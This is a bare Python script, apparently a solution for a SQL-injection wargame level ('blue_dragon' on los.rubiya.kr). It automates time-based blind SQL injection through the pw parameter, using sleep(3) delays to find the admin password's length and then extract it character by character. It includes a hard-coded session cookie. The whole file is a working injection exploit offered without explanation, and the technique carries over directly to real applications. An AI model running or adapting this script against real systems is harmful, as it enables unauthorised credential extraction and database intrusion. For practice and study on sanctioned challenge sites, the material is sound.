import requests
import string 
import time 

url = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php?"
cookie = {'PHPSESSID':'vhk3v05udt053p3tubi0jcpovl'}

def pw_length():
    pw_len = 0
    while True:
        pw_len += 1
        query = "pw=' or if(id='admin' and length(pw)={},sleep(3),1)%23".format(pw_len)
        print(query)
        start = time.time()
        res = requests.get(url=url+query,cookies=cookie)
        end = time.time() - start
        if end > 2.5:
            print("PASSWORD LENGTH : " + str(pw_len))
            break
    return pw_len

def pw_char(pw_len):
    passwd = ""
    for i in range(1, pw_len+1):
        for j in string.printable:
                query = "pw=' or if(id='admin' and ascii(substr(pw,{},1))={},sleep(3),1)%23".format(i, ord(j))
                print(query)
                start = time.time()
                res = requests.get(url=url+query,cookies=cookie)
                end = time.time() - start 
                if end > 2.5:
                    passwd += j
                    print("PASSWORD CHAR : " + j)
                    break
    print("PASSWORD : " + passwd)

if __name__ == "__main__":
    pw_len = pw_length()
    pw_char(pw_len)
